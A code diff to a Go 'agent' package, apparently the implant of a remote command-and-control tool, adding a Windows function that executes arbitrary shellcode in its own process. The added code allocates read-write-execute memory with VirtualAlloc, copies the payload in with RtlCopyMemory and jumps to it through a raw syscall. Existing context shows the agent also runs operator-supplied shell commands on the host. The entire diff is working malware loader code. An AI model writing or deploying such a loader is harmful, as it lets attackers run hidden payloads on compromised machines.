@@ -20,10 +20,24 @@
 package agent
 
 import (
+	// Standard
+	"errors"
 	"fmt"
-	"github.com/mattn/go-shellwords"
 	"os/exec"
 	"syscall"
+	"unsafe"
+
+	// Sub Repositories
+	"golang.org/x/sys/windows"
+
+	// 3rd Party
+	"github.com/mattn/go-shellwords"
+)
+
+const (
+	MEM_COMMIT             = 0x1000
+	MEM_RESERVE            = 0x2000
+	PAGE_EXECUTE_READWRITE = 0x40
 )
 
 // ExecuteCommand is function used to instruct an agent to execute a command on the host operating system
@@ -48,4 +62,38 @@ func ExecuteCommand(name string, arg string) (stdout string, stderr string) {
 	}
 
 	return stdout, stderr
+}
+
+// ExecuteShellcodeSelf executes provided shellcode in the current process
+func ExecuteShellcodeSelf(shellcode []byte) error {
+
+	kernel32 := windows.NewLazySystemDLL("kernel32")
+	ntdll := windows.NewLazySystemDLL("ntdll.dll")
+
+	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
+	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
+
+	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+
+	if errVirtualAlloc.Error() != "The operation completed successfully."  {
+		return errVirtualAlloc
+	}
+
+	if addr == 0 {
+		return errors.New("VirtualAlloc failed and returned 0")
+	}
+
+	_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+
+	if errRtlCopyMemory.Error() != "The operation completed successfully." {
+		return errRtlCopyMemory
+	}
+
+	_, _, errSyscall := syscall.Syscall(addr, 0, 0, 0, 0)
+
+	if errSyscall != 0 {
+		return errSyscall
+	}
+
+	return nil
 }
